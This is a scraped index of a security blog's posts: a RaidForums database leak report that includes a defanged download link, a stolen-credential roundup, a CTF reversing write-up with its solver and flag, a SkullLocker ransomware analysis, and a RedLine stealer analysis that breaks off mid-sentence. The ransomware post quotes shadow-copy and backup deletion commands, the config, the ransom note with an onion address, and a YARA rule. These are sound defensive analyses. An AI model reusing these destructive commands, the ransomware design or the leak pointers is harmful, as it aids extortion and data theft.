[{"content":"Hey folks, in this month, a hacking forum known as \u0026ldquo;Exposed\u0026rdquo; has gained significant attention. Yesterday, the administrator, named Impotent, leaked a RaidForums database. This forum(Exposed) has been actively trying to be similar as Breached community in an aggressive manner, so far by attacking two other competing forums. This forum also has feature that Breached didn\u0026rsquo;t have, such as ransomware section. The leaked data includes users registered between 2020/2021. It should be noted that Impotent mentioned the removal of certain users without providing any explanation. Additionally, the source of the leak was not disclosed.\nMore about Exposed The Exposed forum was launched on May 9, 2023, with an advertisement on Twitter. However, the publisher restricted the visibility of the tweet posted by Trlstan Wille https://twitter.com/D4RKR4BB1T47/status/1655821904979034112. The forum was also promoted on Telegram under a different name, which we now know as Impotent, who is the admin of the forum. Impotent initially began sharing the forum on Twitter.\nSubsequently, he transitioned to Telegram channels to promote and expand his forum.\nThis first message was sent on May 9, 2023\nBack to Raidforums leak The leaked data consists of a single SQL file containing a users table named mybb_users, which holds information for over 478,000+ users.\nAlso, old RaidForums members have verified that their information is indeed present in the leaked database, confirming its legitimately. The table contains information such as:\n1 usernames, email addresses, hashed passwords, registration dates and much more Although it is probable that law enforcement has obtained the database following the seizure of the forum, the leaked data remains valuable for security researchers. These researchers often construct profiles of threat actors, and the leaked registration information can contribute to their efforts. By analyzing this information, researchers can gain insights into the threat actors and potentially establish connections to other malicious activities.\nConclusion Leaked site raidforums.com Posted on exposed forum Post date 5/29/2023 05:15 PM Posted by Impotent Leak Source Unknown Admin telegram @ImpotentDude File Link https[xx]//files[.]doxbin[.]gg/pcZQOWsY.rar File name raidforums.com.sql (Table: mybb_users) File Hash 86156c7db10dc6f7b4257da50a01fa37 (MD5) ","permalink":"https://r1ddll3.github.io/threatintel/raidforums_leak/","summary":"Hey folks, in this month, a hacking forum known as \u0026ldquo;Exposed\u0026rdquo; has gained significant attention. Yesterday, the administrator, named Impotent, leaked a RaidForums database. This forum(Exposed) has been actively trying to be similar as Breached community in an aggressive manner, so far by attacking two other competing forums. This forum also has feature that Breached didn\u0026rsquo;t have, such as ransomware section. The leaked data includes users registered between 2020/2021. It should be noted that Impotent mentioned the removal of certain users without providing any explanation.","title":"Raidforums Leak"},{"content":"Hey folks, During a recent threat intelligence research, I discovered concerning findings regarding website security. Specifically, I uncovered that 1,200 websites are being compromised and used for phishing campaigns and also most of them being leaked every 4-6 days, with a majority of 60% being published as FTPS access. Furthermore, sensitive credentials from numerous companies, institutes, and even governments were also found to be leaked, including endpoints that may not have been accessible through typical reconnaissance measures, such as internal VPN access and employee portals. The attackers used (info stealers), and unfortunately, many of the leaked credentials are still valid. Shockingly, many of these endpoints do not even utilize two-factor authentication.\nIt is clear that many companies lack proper security awareness, as there needs to be a heightened sense of mistrust towards employee activity, and mentors should educate all employees on the dangers of phishing and how to avoid it. This is not just for non-security employees, as I also discovered leaked credentials for those working in security companies.\nLastly, I came across a leak containing the personal information of approximately 10,000 individuals who were scammed. This information, including (credit card details, emails, IDs, and SSNs).\nThe top targeted entities during these attacks were financial institutions like (Citi Bank, Bank of America and USAA Bank also south Africa banks), as well as shipping companies such as (DHL) and the (Post Office) service.\nSamples IDs Leak This leak contains 60 ID CARDS WITH SELFIE For People who were scammed.\nCredit Card Leak This leak contains 10,000 individuals who were scammed Credentials Leak This leak contains sensitive credentials from numerous companies, institutes, and even governments such as (Vodafone, Etisalat, Brazil Government, Customers for BanqueMisr, su.edu.sa and many more) Compromised Sites leak This leak contains 4,600 compromised Website \u0026amp; FTPS access. Conclusion last thing it is crucial that companies ensure their threat intelligence teams are proactively monitoring for breaches and that employees are educated on how to avoid falling prey to scams and phishing attempts.\nThanks For Reading.. ","permalink":"https://r1ddll3.github.io/threatintel/threatintel_research/","summary":"Hey folks, During a recent threat intelligence research, I discovered concerning findings regarding website security. Specifically, I uncovered that 1,200 websites are being compromised and used for phishing campaigns and also most of them being leaked every 4-6 days, with a majority of 60% being published as FTPS access. Furthermore, sensitive credentials from numerous companies, institutes, and even governments were also found to be leaked, including endpoints that may not have been accessible through typical reconnaissance measures, such as internal VPN access and employee portals.","title":"Threat Intel Research"},{"content":" We were given a file and that file was ELF and we can determine that by using DIE After we open the file in IDA Pro and press F5 to view the pseudocode we will see below code The code performs a series of mathematical conditions using the characters in the string s and checks if the results are equal to certain specific values. If all the conditions are matached, the program will print a message that tells us if the input is valid or invalid.\nSo, we can solve the challenge by mtaching these all conditions.\nWe can solve this challenge using z3-solver python library, solving script which I created is\nfrom z3 import Solver, BitVec a = [BitVec(f's{i}',8) for i in range(34)] # 34 is the length of the flag # we knew that from the psudocode. solver = Solver() # ensure that each element of the list `a` is a printable ASCII character for i in range(10,33): solver.add(a[i] \u0026gt;= ord('0')) solver.add(a[i] \u0026lt;= ord('z')) # Set the flag format to 'VishwaCTF{' FLAG_FORMAT = \u0026quot;VishwaCTF{\u0026quot; # Add constraints to enforce that the first 11 elements of list `a` # correspond to the characters in the FLAG_FORMAT string for i, char in enumerate(FLAG_FORMAT): solver.add(a[i] == ord(char)) # enforce that the last element in the flag is `}` solver.add(a[33] == ord(\u0026quot;}\u0026quot;)) # Add constraints solver.add(a[3] + a[4] + a[1] + a[7] - a[8] * a[2] * a[6] * a[5] - a[11] - a[9] - a[10] == -52316790) solver.add(a[3] - a[4] - a[6] + a[9] + a[8] * a[11] * a[10] - a[2] + a[5] + a[7] * a[12] == 285707) solver.add(a[11] + a[10] * a[4] + a[3] - a[12] * a[7] - a[13] - a[5] * a[9] * a[6] + a[8] == -797145) solver.add(a[4] + a[12] - a[7] * a[11] - a[9] - a[5] * a[6] - a[14] - a[8] * a[13] * a[10] == -289275) solver.add(a[13] + a[14] + a[7] + a[6] - a[12] - a[15] * a[11] - a[5] + a[8] * a[10] * a[9] == 666868) solver.add(a[12] + a[15] * a[16] + a[11] + a[13] - a[10] + a[6] * a[8] - a[7] - a[9] + a[14] == 9837) solver.add(a[7] + a[11] - a[8] + a[16] * a[13] - a[17] - a[14] - a[9] + a[10] * a[15] - a[12] == 9858) solver.add(a[17] + a[12] + a[9] - a[18] - a[8] - a[15] + a[16] + a[11] * a[14] * a[13] - a[10] == 296504) solver.add(a[11] * a[13] * a[18] * a[16] - a[17] - a[10] + a[9] + a[15] * a[12] - a[19] - a[14] == 10963387) solver.add(a[17] + a[16] + a[20] + a[12] - a[14] * a[18] * a[15] * a[19] - a[13] - a[11] - a[10] == -65889660) solver.add(a[16] - a[19] - a[15] + a[11] * a[13] + a[18] + a[21] * a[12] + a[14] + a[17] * a[20] == 13340) solver.add(a[18] * a[16] + a[17] * a[15] - a[20] - a[12] - a[19] * a[14] + a[22] + a[13] * a[21] == 4641) solver.add(a[15] + a[20] + a[18] + a[21] + a[13] * a[19] - a[22] - a[16] - a[14] + a[17] * a[23] == 6428) solver.add(a[19] * a[24] + a[15] * a[20] + a[16] * a[14] + a[23] - a[18] * a[21] - a[22] * a[17] == 7851) solver.add(a[19] + a[24] + a[22] + a[21] + a[25] + a[16] + a[18] + a[20] * a[23] - a[15] + a[17] == 2997) solver.add(a[17] * a[23] + a[20] * a[25] - a[16] + a[26] * a[21] - a[24] + a[22] * a[19] * a[18] == 342425) solver.add(a[20] + a[26] + a[24] * a[17] + a[27] * a[22] * a[25] - a[21] - a[19] * a[18] + a[23] == 243251) solver.add(a[24] + a[22] + a[25] * a[21] - a[28] - a[19] - a[26] * a[27] * a[20] - a[23] + a[18] == -434772) solver.add(a[28] + a[19] + a[25] + a[29] - a[24] - a[21] - a[23] + a[27] - a[22] * a[26] + a[20] == -4957) solver.add(a[21] + a[30] + a[26] + a[22] * a[23] - a[29] + a[20] - a[24] * a[25] - a[27] - a[28] == -1625) solver.add(a[22] + a[26] + a[25] + a[30] + a[23] - a[24] - a[29] - a[31] - a[21] - a[27] - a[28] == -144) solver.add(a[29] + a[30] + a[31] - a[26] - a[25] - a[23] - a[28] - a[27] - a[22] - a[32] * a[24] == -7001) solver.add(a[33] + a[25] - a[31] * a[23] + a[27] - a[26] * a[32] + a[30] - a[24] * a[29] - a[28] == -18763) sat = solver.check() # Check if the model is \u0026quot;satisfied\u0026quot; if sat: model = solver.model() # returns an array of s[flag_length] = flag_chars flag = '' for i in a: # a = 34 = the length of the flag flag += chr(model[i].as_long()) # combine the flag print(f\u0026quot;Flag: {flag}\u0026quot;) else: print(\u0026quot;Not satisfied\u0026quot;) # Didn't work \u0026quot;unsatisfied\u0026quot; So, by running this script I was able to get the flag easily.\nFlag: VishwaCTF{N3V3r_60NN4_61V3_Y0U_UP}\n","permalink":"https://r1ddll3.github.io/ctfs/vishwactf/wednesday_thursday/","summary":"We were given a file and that file was ELF and we can determine that by using DIE After we open the file in IDA Pro and press F5 to view the pseudocode we will see below code The code performs a series of mathematical conditions using the characters in the string s and checks if the results are equal to certain specific values. If all the conditions are matached, the program will print a message that tells us if the input is valid or invalid.","title":"VishwaCTF 2023 -   Reverse Wednesday Thursday Friday"},{"content":"Analyze - SkullLockerRansomware SkullLocker is a new variant of the Chaos ransomware family. Ransomware is spread using various techniques such as spam emails and fake torrent sites. This particular type of ransomware encrypts files and adds a \u0026ldquo;.skull\u0026rdquo; extension to filenames.\nOverview The malware is coded using .NET we can determine that using Detect it easy(DiE) Tool: Code analysis The malware doesn\u0026rsquo;t come packed or something we can just decompile it using dnSpy and start analyzing the code and see its behavior and capabilities.\nAt the beginning the malware defines some variables which the author can edit and customize the malware like, (Message, processName, spreadName and Ransomware text message)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 userName = Environment.UserName; userDir = \u0026#34;C:\\\\Users\\\\\u0026#34;; appMutexRun = \u0026#34;7z459ajrk722yn8c5j4fg\u0026#34;; encryptionAesRsa = true; encryptedFileExtension = \u0026#34;skull\u0026#34;; checkSpread = true; spreadName = \u0026#34;skull.exe\u0026#34;; checkCopyRoaming = true; processName = \u0026#34;svchost.exe\u0026#34;; appMutexRun2 = \u0026#34;2X28tfRmWaPyPQgvoHV\u0026#34;; checkStartupFolder = true; checkSleep = true; sleepTextbox = 10; base64Image = \u0026#34;#base64Image\u0026#34;; appMutexStartup = \u0026#34;1qw0ll8p9m8uezhqhyd\u0026#34;; droppedMessageTextbox = \u0026#34;read_it.txt\u0026#34;; checkAdminPrivilage = true; checkdeleteShadowCopies = true; checkdisableRecoveryMode = true; checkdeleteBackupCatalog = true; appMutexStartup2 = \u0026#34;17CqMQFeuB3NTzJ\u0026#34;; appMutex2 = Program.appMutexStartup2 + Program.appMutexRun2; staticSplit = \u0026#34;bc\u0026#34;; appMutex = Program.staticSplit + Program.appMutexStartup + Program.appMutexRun; Already Running First, the malware defines a method called AlreadyRunning which checks if there is already an instance of the current process running.\nThe method first uses Process.GetProcesses() to get a list of all currently running processes. It then uses Process.GetCurrentProcess() to get a reference to the current process.\nThe method then iterates through each of the processes in the list and checks if the first module in the process\u0026rsquo;s module collection has the same file name as the current executing assembly(Malware), which is obtained using Assembly.GetExecutingAssembly().Location, Assembly.GetExecutingAssembly().Location will return the full path of the malware.\nIf a process is found that matches these conditions, the method returns true and the application will exit. If no matching process is found, the method returns false.\nCheck Admin Privilege 1 2 3 4 if (Program.checkAdminPrivilage) { Program.copyResistForAdmin(Program.processName); } If we take a look at copyResistForAdmin method private static string processName = \u0026quot;svchost.exe\u0026quot;; We know that the processName is svchost.exe so this method attempts to copy the current executable to a location within the user\u0026rsquo;s /AppData/Roaming/ folder using a filename of svchost.exe. Since svchost.exe is a legitimate system process, this an attempt by malware to disguise itself as a legitimate system process and avoid detection. Once the malware has copied itself to the new location and is running as an administrator, it could use this persistence mechanism to remain undetected and ensure that the malware can persist on the victim\u0026rsquo;s machine even after a system reboot or shutdown and if an exception occurs when attempting to start the new process with elevated privileges (the user declines the UAC prompt), the method recursively calls itself using the same processName argument.\naddLinkToStartup This code defines a static method called addLinkToStartup that adds a shortcut to the current executable to %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu and the name of the shortcut is svchost.url. This method essentially ensures that the current executable will run every time the user logs into the system, making it a persistence mechanism.\nEncrypt Directories This method is responsible for encrypting directories in the given location. if we take a look at lookForDirectories and it calls method named encryptDirectory and this method gets a list of all files in the given location using .GetFiles function, then loops through each file and this if (Array.Exists\u0026lt;string\u0026gt;(Program.validExtensions, (string E) =\u0026gt; E == extension.ToLower()) \u0026amp;\u0026amp; fileName != Program.droppedMessageTextbox) checks if the file extension is in the validExtensions array and is not the droppedMessageTextbox and we know that droppedMessageTextbox = \u0026quot;read_it.txt\u0026quot;; and this file read_it.txt has the message that the victim sees after the encryption process finished. And these are the targeted folders Also these are the validExtensions\n1 \u0026#34;.txt\u0026#34;,\u0026#34;.jar\u0026#34;,\u0026#34;.dat\u0026#34;,\u0026#34;.contact\u0026#34;,\u0026#34;.settings\u0026#34;,\u0026#34;.doc\u0026#34;,\u0026#34;.docx\u0026#34;,\u0026#34;.xls\u0026#34;,\u0026#34;.xlsx\u0026#34;,\u0026#34;.ppt\u0026#34;,\u0026#34;.pptx\u0026#34;,\u0026#34;.odt\u0026#34;,\u0026#34;.jpg\u0026#34;,\u0026#34;.mka\u0026#34;,\u0026#34;.mhtml\u0026#34;,\u0026#34;.oqy\u0026#34;,\u0026#34;.png\u0026#34;,\u0026#34;.csv\u0026#34;,\u0026#34;.py\u0026#34;,\u0026#34;.sql\u0026#34;,\u0026#34;.mdb\u0026#34;,\u0026#34;.php\u0026#34;,\u0026#34;.asp\u0026#34;,\u0026#34;.aspx\u0026#34;,\u0026#34;.html\u0026#34;,\u0026#34;.htm\u0026#34;,\u0026#34;.xml\u0026#34;,\u0026#34;.psd\u0026#34;,\u0026#34;.pdf\u0026#34;,\u0026#34;.xla\u0026#34;,\u0026#34;.cub\u0026#34;,\u0026#34;.dae\u0026#34;,\u0026#34;.indd\u0026#34;,\u0026#34;.cs\u0026#34;,\u0026#34;.mp3\u0026#34;,\u0026#34;.mp4\u0026#34;,\u0026#34;.dwg\u0026#34;,\u0026#34;.zip\u0026#34;,\u0026#34;.rar\u0026#34;,\u0026#34;.mov\u0026#34;,\u0026#34;.rtf\u0026#34;,\u0026#34;.bmp\u0026#34;,\u0026#34;.mkv\u0026#34;,\u0026#34;.avi\u0026#34;,\u0026#34;.apk\u0026#34;,\u0026#34;.lnk\u0026#34;,\u0026#34;.dib\u0026#34;,\u0026#34;.dic\u0026#34;,\u0026#34;.dif\u0026#34;,\u0026#34;.divx\u0026#34;,\u0026#34;.iso\u0026#34;,\u0026#34;.7zip\u0026#34;,\u0026#34;.ace\u0026#34;,\u0026#34;.arj\u0026#34;,\u0026#34;.bz2\u0026#34;,\u0026#34;.cab\u0026#34;,\u0026#34;.gzip\u0026#34;,\u0026#34;.lzh\u0026#34;,\u0026#34;.tar\u0026#34;,\u0026#34;.jpeg\u0026#34;,\u0026#34;.xz\u0026#34;,\u0026#34;.mpeg\u0026#34;,\u0026#34;.torrent\u0026#34;,\u0026#34;.mpg\u0026#34;,\u0026#34;.core\u0026#34;,\u0026#34;.pdb\u0026#34;,\u0026#34;.ico\u0026#34;,\u0026#34;.pas\u0026#34;,\u0026#34;.db\u0026#34;,\u0026#34;.wmv\u0026#34;,\u0026#34;.swf\u0026#34;,\u0026#34;.cer\u0026#34;,\u0026#34;.bak\u0026#34;,\u0026#34;.backup\u0026#34;,\u0026#34;.accdb\u0026#34;,\u0026#34;.bay\u0026#34;,\u0026#34;.p7c\u0026#34;,\u0026#34;.exif\u0026#34;,\u0026#34;.vss\u0026#34;,\u0026#34;.raw\u0026#34;,\u0026#34;.m4a\u0026#34;,\u0026#34;.wma\u0026#34;,\u0026#34;.flv\u0026#34;,\u0026#34;.sie\u0026#34;,\u0026#34;.sum\u0026#34;,\u0026#34;.ibank\u0026#34;,\u0026#34;.wallet\u0026#34;,\u0026#34;.css\u0026#34;,\u0026#34;.js\u0026#34;,\u0026#34;.rb\u0026#34;,\u0026#34;.crt\u0026#34;,\u0026#34;.xlsm\u0026#34;,\u0026#34;.xlsb\u0026#34;,\u0026#34;.7z\u0026#34;,\u0026#34;.cpp\u0026#34;,\u0026#34;.java\u0026#34;,\u0026#34;.jpe\u0026#34;,\u0026#34;.ini\u0026#34;,\u0026#34;.blob\u0026#34;,\u0026#34;.wps\u0026#34;,\u0026#34;.docm\u0026#34;,\u0026#34;.wav\u0026#34;,\u0026#34;.3gp\u0026#34;,\u0026#34;.webm\u0026#34;,\u0026#34;.m4v\u0026#34;,\u0026#34;.amv\u0026#34;,\u0026#34;.m4p\u0026#34;,\u0026#34;.svg\u0026#34;,\u0026#34;.ods\u0026#34;,\u0026#34;.bk\u0026#34;,\u0026#34;.vdi\u0026#34;,\u0026#34;.vmdk\u0026#34;,\u0026#34;.onepkg\u0026#34;,\u0026#34;.accde\u0026#34;,\u0026#34;.jsp\u0026#34;,\u0026#34;.json\u0026#34;,\u0026#34;.gif\u0026#34;,\u0026#34;.log\u0026#34;,\u0026#34;.gz\u0026#34;,\u0026#34;.config\u0026#34;,\u0026#34;.vb\u0026#34;,\u0026#34;.m1v\u0026#34;,\u0026#34;.sln\u0026#34;,\u0026#34;.pst\u0026#34;,\u0026#34;.obj\u0026#34;,\u0026#34;.xlam\u0026#34;,\u0026#34;.djvu\u0026#34;,\u0026#34;.inc\u0026#34;,\u0026#34;.cvs\u0026#34;,\u0026#34;.dbf\u0026#34;,\u0026#34;.tbi\u0026#34;,\u0026#34;.wpd\u0026#34;,\u0026#34;.dot\u0026#34;,\u0026#34;.dotx\u0026#34;,\u0026#34;.xltx\u0026#34;,\u0026#34;.pptm\u0026#34;,\u0026#34;.potx\u0026#34;,\u0026#34;.potm\u0026#34;,\u0026#34;.pot\u0026#34;,\u0026#34;.xlw\u0026#34;,\u0026#34;.xps\u0026#34;,\u0026#34;.xsd\u0026#34;,\u0026#34;.xsf\u0026#34;,\u0026#34;.xsl\u0026#34;,\u0026#34;.kmz\u0026#34;,\u0026#34;.accdr\u0026#34;,\u0026#34;.stm\u0026#34;,\u0026#34;.accdt\u0026#34;,\u0026#34;.ppam\u0026#34;,\u0026#34;.pps\u0026#34;,\u0026#34;.ppsm\u0026#34;,\u0026#34;.1cd\u0026#34;,\u0026#34;.3ds\u0026#34;,\u0026#34;.3fr\u0026#34;,\u0026#34;.3g2\u0026#34;,\u0026#34;.accda\u0026#34;,\u0026#34;.accdc\u0026#34;,\u0026#34;.accdw\u0026#34;,\u0026#34;.adp\u0026#34;,\u0026#34;.ai\u0026#34;,\u0026#34;.ai3\u0026#34;,\u0026#34;.ai4\u0026#34;,\u0026#34;.ai5\u0026#34;,\u0026#34;.ai6\u0026#34;,\u0026#34;.ai7\u0026#34;,\u0026#34;.ai8\u0026#34;,\u0026#34;.arw\u0026#34;,\u0026#34;.ascx\u0026#34;,\u0026#34;.asm\u0026#34;,\u0026#34;.asmx\u0026#34;,\u0026#34;.avs\u0026#34;,\u0026#34;.bin\u0026#34;,\u0026#34;.cfm\u0026#34;,\u0026#34;.dbx\u0026#34;,\u0026#34;.dcm\u0026#34;,\u0026#34;.dcr\u0026#34;,\u0026#34;.pict\u0026#34;,\u0026#34;.rgbe\u0026#34;,\u0026#34;.dwt\u0026#34;,\u0026#34;.f4v\u0026#34;,\u0026#34;.exr\u0026#34;,\u0026#34;.kwm\u0026#34;,\u0026#34;.max\u0026#34;,\u0026#34;.mda\u0026#34;,\u0026#34;.mde\u0026#34;,\u0026#34;.mdf\u0026#34;,\u0026#34;.mdw\u0026#34;,\u0026#34;.mht\u0026#34;,\u0026#34;.mpv\u0026#34;,\u0026#34;.msg\u0026#34;,\u0026#34;.myi\u0026#34;,\u0026#34;.nef\u0026#34;,\u0026#34;.odc\u0026#34;,\u0026#34;.geo\u0026#34;,\u0026#34;.swift\u0026#34;,\u0026#34;.odm\u0026#34;,\u0026#34;.odp\u0026#34;,\u0026#34;.oft\u0026#34;,\u0026#34;.orf\u0026#34;,\u0026#34;.pfx\u0026#34;,\u0026#34;.p12\u0026#34;,\u0026#34;.pl\u0026#34;,\u0026#34;.pls\u0026#34;,\u0026#34;.safe\u0026#34;,\u0026#34;.tab\u0026#34;,\u0026#34;.vbs\u0026#34;,\u0026#34;.xlk\u0026#34;,\u0026#34;.xlm\u0026#34;,\u0026#34;.xlt\u0026#34;,\u0026#34;.xltm\u0026#34;,\u0026#34;.svgz\u0026#34;,\u0026#34;.slk\u0026#34;,\u0026#34;.tar.gz\u0026#34;,\u0026#34;.dmg\u0026#34;,\u0026#34;.ps\u0026#34;,\u0026#34;.psb\u0026#34;,\u0026#34;.tif\u0026#34;,\u0026#34;.rss\u0026#34;,\u0026#34;.key\u0026#34;,\u0026#34;.vob\u0026#34;,\u0026#34;.epsp\u0026#34;,\u0026#34;.dc3\u0026#34;,\u0026#34;.iff\u0026#34;,\u0026#34;.onepkg\u0026#34;,\u0026#34;.onetoc2\u0026#34;,\u0026#34;.opt\u0026#34;,\u0026#34;.p7b\u0026#34;,\u0026#34;.pam\u0026#34;,\u0026#34;.r3d\u0026#34; if the file size is less than 2MB it is encrypted using the EncryptFile method and if the size is bigger than 200 MB a random string of a random length between 200000000 and 300000000 bytes is generated and encoded using the randomEncode method after that, the original file renamed to a random 4-character extension using RandomStringForExtension.\nEncrypt File used to encrypt a file using AES encryption algorithm with a randomly generated password. The method reads the contents of the file into a byte array, generates a random password using the CreatePassword method, and converts the password to a byte array using UTF8 encoding. The method then writes the encrypted key and the encrypted content to the file. The encrypted key is the RSA encrypted random password generated earlier, and the encrypted content is the output of the AES encryption. Both of these are concatenated and written to the file using the File.WriteAllText method. Finally, the method renames the original file by appending a random extension using the RandomStringForExtension method\nRegistry Startup This method adds the path of the current executable to the Windows registry SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run named Microsoft Store also used for persistence.\nSpread It private static string spreadName = \u0026quot;skull.exe\u0026quot;; This code is responsible for spreading the malware to other drives on the victim\u0026rsquo;s machine. It loops through all the available drives on the system using the DriveInfo.GetDrives() method and checks if the drive is not the C:\\ drive and if a file with the spreadName doesn\u0026rsquo;t exist in that drive. If both conditions are true, it copies the malware\u0026rsquo;s executable file to that drive with the specified spreadName. This way, the malware can potentially infect other machines or systems that are connected to those drives.\nMalware Message This code is responsible for creating a file with droppedMessageTextbox value and we already know the name of the file private static string droppedMessageTextbox = \u0026quot;read_it.txt\u0026quot;; and then write the content of the Program.messages value into it and then open the file to the victim to let him know that his files have been encrypted. The message variable written in polish translate it by yourself :D 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 Witaj, Twoje pliki zostały zaszyfrowane przez SkullLocker ransomware. Aby odzyskać dostęp do nich musizapłacić okup w ciągu 72 godzin. W przeciwnym razie dane zostaną trwale utracone. Aby uzyskać więcej informacji na temat sposobu zapłaty okupu i odzyskiwania plików przejdź na stronę internetową podaną poniżej. U6cQ2nV4KzL3H8jxSdGhTfMlR0N1wX7eJbO9mZyIaP5pgqWvEoBkYtAxDsFi.onion Jeśli masz jakiekolwiek pytania możesz skontaktować się z nami za pomocą adresu e-mail [adres e-mail]. Nie próbuj usuwać programu ransomware ani próbować odzyskać danych za pomocą oprogramowania antywirusowego. Może to spowodować trwałe uszkodzenie Twoich plików. Pamiętaj że czas jest kluczowy. Im dłużej zwlekasz tym mniejsze szanse na odzyskanie Twoich plików. Pozdrawiamy Zespół ransomware Ransom Wallet Addresses The code first reads the current contents of the clipboard using a method called GetText from a NotificationForm object. If the clipboard text starts with the string \u0026ldquo;bc1\u0026rdquo;, the code seems to be manipulating the contents of the clipboard to ensure that certain strings are present or replaced with specific values and the values are stored in appMutex2 and appMutex if we went back to the variables that at the beginning we will notice that appMutex = Program.staticSplit + Program.appMutexStartup + Program.appMutexRun;and appMutex2 = Program.appMutexStartup2 + Program.appMutexRun2;after we concatenate these values together we will get 2 Bitcoin Wallets So, using Threat Intel we can determine if there is wallet with this address by going to Blockchain. Change Wallpaper First base64Image has the base64 of the wallpaper then it attempts to write the decoded bytes to a temporary file with a random name and a \u0026ldquo;.jpg\u0026rdquo; extension. Then, it calls the SystemParametersInfo function with the parameters 20U (indicating that the desktop wallpaper should be changed), 0U (indicating that the wallpaper should be changed immediately), the path to the temporary file, and 3U (indicating that the wallpaper should be tiled).\nDelete Shadow Copies 1 2 3 4 private static void deleteShadowCopies() { Program.runCommand(\u0026#34;vssadmin delete shadows /all /quiet \u0026amp; wmic shadowcopy delete\u0026#34;); } This code invokes two command-line tools, vssadmin and wmic, to delete all the existing shadow copies on the victim\u0026rsquo;s machine. The code is effectively preventing the victim from restoring their data using the shadow copies.\nDelete backup 1 2 3 4 private static void deleteBackupCatalog() { Program.runCommand(\u0026#34;wbadmin delete catalog -quiet\u0026#34;); } This command is used to delete the backup catalog on a local Windows computer without prompting the user for confirmation.\nMapping to MITRE ID Tactics Technique Description T1547.001 Persistence, Privilege Escalation Boot or Logon Autostart Execution Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \u0026ldquo;run keys\u0026rdquo; in the Registry or startup folder will cause the program referenced to be executed when a user logs in. These programs will be executed under the context of the user and will have the account\u0026rsquo;s associated permissions level. Placing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is C:\\Users[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup T1037.005 Persistence, Privilege Escalation Boot or Logon Initialization Scripts Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence. Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely. T1027 Defense Evasion Obfuscated Files or Information Encode data using Base64, Encrypt data using AES via .NET T1070.004 Defense Evasion Indicator Removal: File Deletion Adversaries may delete files left behind by the actions of their intrusion activity. Deletes the backup plan of Windows, Deletes shadow drive data (related to ransomware) T1471 Impact Data Encrypted for Impact The adversary is trying to manipulate, interrupt, or destroy your devices and data and hold it for ransom IOCs Indicator Type Value SHA256 bb5ca9d8de51734dbd14dc081c7c892d819cd14fafd7ccd62849d70f9e679369 Yara Rule rule skull_locker { meta: author = \u0026quot;R1ddl3\u0026quot; description = \u0026quot;Yara rule for detecting SkullLocker Ransomware\u0026quot; hash = \u0026quot;bb5ca9d8de51734dbd14dc081c7c892d819cd14fafd7ccd62849d70f9e679369\u0026quot; strings: $mz = { 4D 5A } // PE file $str1 = \u0026quot;skull.exe\u0026quot; $str2 = \u0026quot;checkCopyRoaming\u0026quot; $str3 = \u0026quot;appMutexRegex\u0026quot; $str4 = \u0026quot;copyResistForAdmin\u0026quot; $str5 = \u0026quot;deleteShadowCopies\u0026quot; $str6 = \u0026quot;lookForDirectories\u0026quot; $str7 = \u0026quot;spreadIt\u0026quot; $str8 = \u0026quot;appMutexRun2\u0026quot; $str9 = \u0026quot;appMutexRun\u0026quot; $str10 = \u0026quot;checkSpread\u0026quot; condition: ($mz at 0) and (4 of ($str*)) and (hash.sha256() == $hash or not $hash) } \u0026ndash; Thanks for reading, hope you enjoyed.\n","permalink":"https://r1ddll3.github.io/malware-analysis/skulllocker/","summary":"Analyze - SkullLockerRansomware SkullLocker is a new variant of the Chaos ransomware family. Ransomware is spread using various techniques such as spam emails and fake torrent sites. This particular type of ransomware encrypts files and adds a \u0026ldquo;.skull\u0026rdquo; extension to filenames.\nOverview The malware is coded using .NET we can determine that using Detect it easy(DiE) Tool: Code analysis The malware doesn\u0026rsquo;t come packed or something we can just decompile it using dnSpy and start analyzing the code and see its behavior and capabilities.","title":"Analyze - SkullLocker Ransomware"},{"content":"RedLine Stealer is capable of gathering information such as logins, passwords, autofill data, cookies and credit card details from all Gecko-based and Chromium-based web browsers. Cyber criminals can misuse this information to access various accounts (e.g., social media, email, banking-related accounts, cryptocurrency wallets).\nThe list of wallets targeted by RedLine stealer includes Armory, AtomicWallet, BitcoinCore, Bytecoin, DashCore, Electrum, Ethereum,and Jaxx. Targeted VPN clients are ProtonVPN, OpenVPN, and NordVPN.\nI will be analyzing the obfuscated sample.\nAnalyzing - RedLineStealer sha256:dd14b18a44ef6ac49edfe5952d5fd8d5c83fc887d405e97da15e572ed092b221 You can download the sample from MalwareBazaar.\nLet\u0026rsquo;s dive in. The malware is coded using .NET but our sample comes packed we can determine that using Detect it easy(DiE) Tool: So I had to unpack it,\nUnpacking stage I ran the malware but before I ran it I used Hollows Hunter tool by hasherezade and it basically Scans all running processes. Recognizes and dumps a variety of potentially malicious implants. this much more easier. By using this command\nhollows_hunter64.exe /loop /kill\n/kill kills processes detected as suspicious. /loop enables continuous scanning. so I ran the malware and boom hollows detected it and dumped the .NET binary and now I can open dnSpy and start analyzing the unpacked malware basically the file creates a process called vbc.exe\nC2 Decryption After browsing the classes and methods there is a code that defines a public static class named \u0026ldquo;Arguments\u0026rdquo;. This class has five static fields that are declared as strings and an integer. The static fields are named IP, ID, Message, Key, and Version. So RedLine encodes the c2 server with a key and a unique Identifier, I searched for the decrytion method and there is method named StringDecrypt This code defines a public static method named Read which takes two string parameters - b64 and stringKey. The method returns a string.\nThe Read method first checks if the input parameter b64 is null, empty or contains only white spaces. If so, it returns an empty string.\nIf the input parameter b64 is not null, empty or contains only white spaces, the code proceeds to decrypt the string. It first decodes the base64-encoded string using the StringDecrypt.FromBase64 method.\nThe resulting string is then decrypted using an (XOR) operation with the stringKey parameter, using the StringDecrypt.Xor method.\nThe decrypted string is then returned.\nOverall, this code is likely used to decrypt a string that has been encoded using base64 and XOR encryption with a specific key.\nSo, I went to CyberChef and I pasted the encoded C2 IP and followed the decryption method first From Base64 then XOR using Steamboats as the key and then From Base64 again. Environment Checker The Check() method first retrieves the current culture info using the 